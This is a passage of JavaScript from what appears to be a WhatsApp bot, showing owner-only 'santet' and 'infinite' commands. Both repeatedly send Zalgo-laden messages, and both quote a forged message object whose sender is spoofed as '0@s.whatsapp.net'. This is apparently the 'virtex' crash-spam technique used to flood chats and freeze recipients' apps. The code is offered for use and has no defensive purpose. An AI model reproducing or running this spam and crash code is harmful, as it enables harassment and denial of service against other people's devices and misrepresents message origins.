            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            freply(`BERHASIL MENGIRIM SANTET`)
            break
                    case 'infinite':               
          if (!isCreator) return
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
